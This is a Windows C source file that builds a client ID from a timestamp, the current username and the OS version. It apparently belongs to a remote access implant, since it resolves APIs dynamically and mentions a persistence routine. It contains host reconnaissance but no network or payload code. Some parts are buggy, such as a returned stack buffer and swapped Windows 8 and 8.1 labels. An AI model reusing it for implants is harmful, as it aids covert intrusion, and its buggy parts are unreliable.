#include "defines.h"
#include "functions.h"

/*
 * timestamps the beginning of a buffer in the format ' [MM/DD/YY HH:MM:SS] '
 * 
 * char *buf: a reference to the client ID buffer 
 * 
 * returns: 1 if successful
 */
int getTime(char *buf)
{
    t_GetLocalTime GetLocalTime = (t_GetLocalTime)dllCall("Kernel32.dll", "GetLocalTime");
    CloseHandle(hDLL);

    // SYSTEMTIME structure that receives the current local date and time from GetLocalTime
    // https://docs.microsoft.com/en-us/windows/win32/api/minwinbase/ns-minwinbase-systemtime
    SYSTEMTIME SystemTime;

    // GetLocalTime fills SystemTime with the current local date and time
    GetLocalTime(&SystemTime);

    // Use mcpy here to 'inject' into buffer, copy 21 bytes rather than 22 to not include the null byte
    mcpy(buf, " [0 /0 /0  0 :0 :0 ] ", 21);

    // Mcpy takes void *, so SystemTime members (ints) need to be converted to char * or the compiler will complain
    mcpy(buf + 3, ntos(SystemTime.wMonth, 10), SystemTime.wMonth < 10 ? 1 : 2);
    mcpy(buf + 5, ntos(SystemTime.wDay, 10), SystemTime.wDay < 10 ? 1 : 2);
    mcpy(buf + 8, ntos(SystemTime.wYear, 10), SystemTime.wYear < 10 ? 1 : 2);

    // Inline statements just change the address that the members are copied to by +/- 1 (to add a trailing 0 if member value is less than 10)
    mcpy(buf + (SystemTime.wHour < 10 ? 12 : 11), (void *)ntos(SystemTime.wHour, 10), SystemTime.wHour < 10 ? 1 : 2);
    mcpy(buf + (SystemTime.wMinute < 10 ? 15 : 14), (void *)ntos(SystemTime.wMinute, 10), SystemTime.wMinute < 10 ? 1 : 2);
    mcpy(buf + (SystemTime.wSecond < 10 ? 18 : 17), (void *)ntos(SystemTime.wSecond, 10), SystemTime.wSecond < 10 ? 1 : 2);

    return 1;
}

/*
 * adds the currently logged in user to the client ID
 * 
 * char *buf: a reference to the client ID buffer
 * 
 * returns: 1 if successful
 */
char *getUsername(char *buf)
{
    t_GetUserNameA GetUserNameA = (t_GetUserNameA)dllCall("Advapi32.dll", "GetUserNameA");
    CloseHandle(hDLL);

    // GetUserNameA's second parameter (pcbBuffer) is a LPDWORD, which means unsigned long * size must be passed by reference (rather than STR_LEN by value)
    unsigned long size = STR_LEN;
    char *usr = (char *)malloc(sizeof(char) * size); // Allocate a buffer that GetUserNameA will save the username in (this will be appended to buf)
    
    GetUserNameA(usr, &size); // NOTE: %USERPROFILE% environment variable could potentially be used here

    // Now that the username is saved in usr, copy user into buf (21 padding to pass the timestamp)
    scpy(buf + 21, usr);

    // Should free usr here, but the getPersistence function requires it. Therefore, it is returned and passed to getPersistence (where it is freed)

    return usr;
}

/*
 * appends the OS version to the client ID (or any other char buffer)
 * 
 * char *buf: a reference to the client ID buffer
 * 
 * returns: 1 if successful
 */
int getOsVersion(char *buf)
{
    t_GetVersionExA GetVersionExA = (t_GetVersionExA)dllCall("Kernel32.dll", "GetVersionExA");
    CloseHandle(hDLL);

    // Create an OSVERSIONINFOEXA structure that will receive the OS information from GetVersionExA
    OSVERSIONINFOEXA OsVersionInfoExA;

    // Before calling GetVersionEx, set the dwOSVersionInfoSize member to indicate which data structure is being passed to this function
    OsVersionInfoExA.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA);

    // Call GetVersionExA, passing a reference to the OSVERSIONINFOEXA structure cast to LPOSVERSIONINFOA
    GetVersionExA((OSVERSIONINFOA *)&OsVersionInfoExA);

    // https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-osversioninfoexa
    int
        isSrv = OsVersionInfoExA.wProductType != 1, // Is this a server? TRUE if wProductType != TRUE
        major = OsVersionInfoExA.dwMajorVersion,    // The major version number of the operating system
        minor = OsVersionInfoExA.dwMinorVersion,    // The minor version number of the operating system
        build = OsVersionInfoExA.dwBuildNumber,     // The build number of the operating system
        wmask = OsVersionInfoExA.wSuiteMask;        // Bit mask that identifies the product suites available on the system

    char *ret = (char *)malloc(64 * sizeof(char)); // Buffer used to concatanate osStr, ver, and svcpk

    // Applications not manifested for Windows 8.1 or Windows 10 will return the Windows 8 OS version value (6.2)
    // If Windows is lying, use verifyVersion (which will query the registry), else continue using information that was returned by GetVersionExA
    if (major == 6 && minor == 2)
        ret = verifyVersion(ret);
    else
    {
        char
            *svcpk = OsVersionInfoExA.szCSDVersion,       // Null-terminated string that indicates the latest Service Pack installed on the system
            *osStr = (char *)malloc(32 * sizeof(char)),   // Temporary buffer used to build the string identifying the OS
                *ver = (char *)malloc(16 * sizeof(char)); // Temporary buffer used to build the string identifying the version

        // Reference the table in the 'Remarks' section of the MS Docs link above to make sense of the following scope

        // If this is a server, start osStr with "Windows Server" else "Windows"
        scpy(osStr, isSrv ? "Windows Server " : "Windows ");

        if (major == 10 && minor == 0)
            scpy(ver, isSrv ? " 2016 or 2019 " : " 10 ");

        if (major == 6)
        {
            if (isSrv)
            {
                scpy(ver, minor >= 2 ? " 2012 " : " 2008 ");
                if (minor == 1 || minor == 3)
                    scpy(ver, " R2 ");
            }
            else
            {
                if (minor == 0)
                    scpy(ver, " Vista ");
                if (minor == 1)
                    scpy(ver, " 7 ");
                if (minor >= 2)
                    scpy(ver, minor == 3 ? "8 " : "8.1 ");
            }
        }
        else if (major == 5 && minor == 2)
        {
            int isR2 = GetSystemMetrics(SM_SERVERR2);
            scpy(ver, isR2 ? " 2003 R2 " : " 2003 ");

            if (wmask & VER_SUITE_WH_SERVER)
                scpy(osStr, "Windows Home Server ");
        }
        else
            scpy(ver, minor == 1 ? " XP " : " 2000 ");

        // Start ret with osStr and then append ver
        scpy(ret, osStr);
        scat(ret, ver);

        // Convert the build number to a string then append it, too
        char *bld = ntos(build, 10);
        scat(ret, bld);

        // Finally, if there is a Service Pack installed, append the identifying string
        if (*svcpk)
            scat(ret, svcpk);

        // Free the heap
        free(osStr);
        free(ver);
    }

    // Append the complete OS information to buf and null-terminate the completed string
    scat(buf, " ");
    scat(buf, ret);

    free(ret);

    return 1;
}

/*
 * used to query the registry for the OS version (because GetVersionExA lies to us after Windows 8.1)
 * 
 * char *ret: a reference to the buffer that will receive the version information
 * 
 * returns: buffer containing "[ProductName] [CurrentBuild]" from HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion 
 */
char *verifyVersion(char *ret)
{
    // NOTE: This produces the same result in less code and should replace getOsVersion entirely in the future to reduce binary size

    HKEY thisHive = HKEY_LOCAL_MACHINE;                                 // Get the address to the HKLM hive
    char thisKey[] = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"; // Define the key to query

    // https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regopenkeyexa
    // Handle to an open registry key, the name of the subkey to be opened, options, access rights, variable that receives a handle to the opened key
    if (RegOpenKeyExA(thisHive, thisKey, 0, KEY_READ, &thisHive) != ERROR_SUCCESS) // If the function succeeds, the return value is ERROR_SUCCESS
        return 0;

    // The subkey names to read strings from
    char const *names[] = {
        "ProductName",
        "CurrentBuild"};

    char *buf = NULL;

    // Iterate through names, passing each to queryRegString and saving the return value (the queried string) in buf
    for (int i = 0; i < sizeof(names) / sizeof(char const *); i++)
        if (buf = queryRegString(thisHive, (char *)names[i])) // If querying the string was successful
        {
            // After the first string, delimit with a space
            if (i != 0)
                scat(ret, " ");

            // Append the string returned by queryRegString to ret. If this isn't the first iteration of the loop, concatenate
            if (i == 0)
                scpy(ret, buf);
            else
                scat(ret, buf);
        }

    // Close the registry key
    RegCloseKey(thisHive);

    return ret;
}

/*
 * reads a string from the registry
 * 
 * HKEY hKey: an open registry key
 * char valueName[]: the key value to be queried (if NULL or empty, the function retrieves the type and data for the key's unnamed or default value)
 *  
 * returns: buffer containing the subkey string if successful
 */
char *queryRegString(HKEY hKey, char valueName[])
{
    char *ret = NULL;
    char lpData[STR_LEN];     // A buffer that receives the value's data
    DWORD lpcbData = STR_LEN; // A variable that specifies the size of the buffer pointed to by lpData

    // https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryvalueexa
    if (RegQueryValueExA(hKey, valueName, NULL, NULL, (LPBYTE)&lpData, &lpcbData) == ERROR_SUCCESS) // If the function succeeds, the return value is ERROR_SUCCESS
        ret = lpData;

    return ret;
}